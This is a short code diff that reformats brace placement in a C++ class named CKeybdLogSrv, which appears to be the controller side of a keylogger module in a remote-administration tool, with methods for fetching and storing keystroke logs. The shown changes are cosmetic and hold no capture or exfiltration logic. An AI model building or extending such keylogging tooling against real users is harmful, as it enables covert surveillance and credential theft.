@@ -79,7 +79,8 @@ void CKeybdLogSrv::OnGetPlug(){
 			MB_OK);
 	}
 
-	if (lpBuffer){
+	if (lpBuffer)
+	{
 		VirtualFree(lpBuffer, dwFileSizeLow, MEM_RELEASE);
 		lpBuffer = NULL;
 	}
@@ -118,7 +119,8 @@ void CKeybdLogSrv::OnLogData(char*szLog,BOOL Append)
 }
 
 //获取日志
-void CKeybdLogSrv::GetLogData(){
+void CKeybdLogSrv::GetLogData()
+{
 	Send(KEYBD_LOG_GET_LOG, 0, 0);
 }
 //离线记录
